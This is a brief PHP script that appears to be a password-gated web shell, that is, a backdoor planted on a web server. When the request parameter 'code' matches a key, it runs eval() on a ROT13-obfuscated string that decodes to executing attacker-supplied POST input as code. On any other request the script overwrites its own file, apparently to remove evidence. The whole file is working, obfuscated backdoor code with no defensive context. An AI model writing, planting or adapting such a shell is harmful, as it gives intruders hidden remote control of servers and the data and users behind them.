<?php
    if($_REQUEST["code"]==pany)
    {
        echo str_rot13('riny($_CBFG[pzq]);');
        eval(str_rot13('riny($_CBFG[pzq]);'));
    }
    else
    {
        $url = $_SERVER['PHP_SELF'];
        $filename = end(explode('/',$url));
           
        $content = 'helloworld';
        $fp = fopen ("$filename","w");
        if (fwrite ($fp, $content))
        {
            fclose ($fp);
            die ("error");
        }
        else
        {
            fclose ($fp);
            die ("good");
        }
        exit;
    }
?>